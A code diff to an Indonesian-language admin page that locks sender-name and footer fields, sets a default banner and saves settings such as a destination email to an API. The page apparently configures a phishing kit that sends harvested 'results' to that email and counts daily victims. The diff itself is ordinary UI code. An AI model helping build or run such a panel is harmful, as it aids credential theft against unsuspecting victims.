@@ -158,6 +158,11 @@
     color:var(--navy);
     outline:none;
   }
+  .input[readonly] {
+    background-color: #f4f6fb;
+    color: #888;
+    cursor: not-allowed;
+  }
   .input:focus{border-color:var(--blue)}
   .group{margin-bottom:18px}
   .row{display:flex;gap:11px}
@@ -242,9 +247,10 @@
     <div class="group">
       <label class="field-label">Nama Ress</label>
       <div class="row">
-        <input type="text" class="input" id="namaRess1" placeholder="BOYZ NEBAR ESPORT">
+        <!-- NAMA RESS DIREADONLY -->
+        <input type="text" class="input" id="namaRess1" value="RESS KENZO" readonly>
         <div class="with-btn">
-          <input type="text" class="input" id="namaRess2" placeholder="app_xxx@4vt6.me">
+          <input type="text" class="input" id="namaRess2" value="app_xjlw@4vt6.me" readonly>
           <button type="button" class="btn-refresh" onclick="randomEmail()"><i class="fa-solid fa-rotate"></i></button>
         </div>
       </div>
@@ -253,8 +259,10 @@
     <div class="group" style="margin-bottom:0">
       <label class="field-label">Banner URL &amp; Footer Text</label>
       <div class="row">
-        <input type="text" class="input" id="bannerUrl" placeholder="atas.jpg">
-        <input type="text" class="input" id="footerText" value="Web Kenz">
+        <!-- TULISAN ATAS.JPG UDAH GUA HAPUS, JADI KOSONG -->
+        <input type="text" class="input" id="bannerUrl" placeholder="Isi URL Banner">
+        <!-- FOOTER TEXT DIREADONLY -->
+        <input type="text" class="input" id="footerText" value="Web Kenz" readonly>
       </div>
     </div>
 
@@ -283,19 +291,24 @@ function randomEmail() {
     document.getElementById('namaRess2').value = `app_${randomStr}@4vt6.me`;
 }
 
-// NARIK DATA CONFIG & STATISTIK
 async function loadData() {
     try {
         const res = await fetch(API_URL + '/api/config');
         const data = await res.json();
         
-        // Isi Form
         if(data.email_tujuan) document.getElementById('emailTujuan').value = data.email_tujuan;
-        if(data.banner_url) document.getElementById('bannerUrl').value = data.banner_url;
-        if(data.footer_text) document.getElementById('footerText').value = data.footer_text;
         if(data.nama_ress) document.getElementById('namaRess1').value = data.nama_ress;
+        if(data.footer_text) document.getElementById('footerText').value = data.footer_text;
 
-        // Isi Statistik (Kalo API udah support)
+        // Kalo di database masih nyimpen "atas.jpg", biarin aja ga usah ditampilin di form
+        // Tapi kalo lu mau nampilin banner dari database (misal link imgur), hapus comment di bawah
+        /*
+        if(data.banner_url) {
+            document.getElementById('bannerUrl').value = data.banner_url;
+        }
+        */
+
+        // Isi Statistik
         if(data.stat_hari_ini !== undefined) document.getElementById('statHariIni').innerText = data.stat_hari_ini;
         if(data.stat_kemarin !== undefined) document.getElementById('statKemarin').innerText = data.stat_kemarin;
         if(data.stat_total !== undefined) document.getElementById('statTotal').innerText = data.stat_total;
@@ -309,9 +322,13 @@ document.getElementById('btnSimpan').addEventListener('click', async function() 
     this.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menyimpan...';
     this.disabled = true;
 
+    // Kalo lu ga isi banner, otomatis pake "atas.jpg" bawaan
+    let bannerVal = document.getElementById('bannerUrl').value.trim();
+    if(!bannerVal) bannerVal = "atas.jpg";
+
     const payload = {
         email_tujuan: document.getElementById('emailTujuan').value,
-        banner_url: document.getElementById('bannerUrl').value,
+        banner_url: bannerVal, 
         footer_text: document.getElementById('footerText').value,
         nama_ress: document.getElementById('namaRess1').value + ' <' + document.getElementById('namaRess2').value + '>'
     };
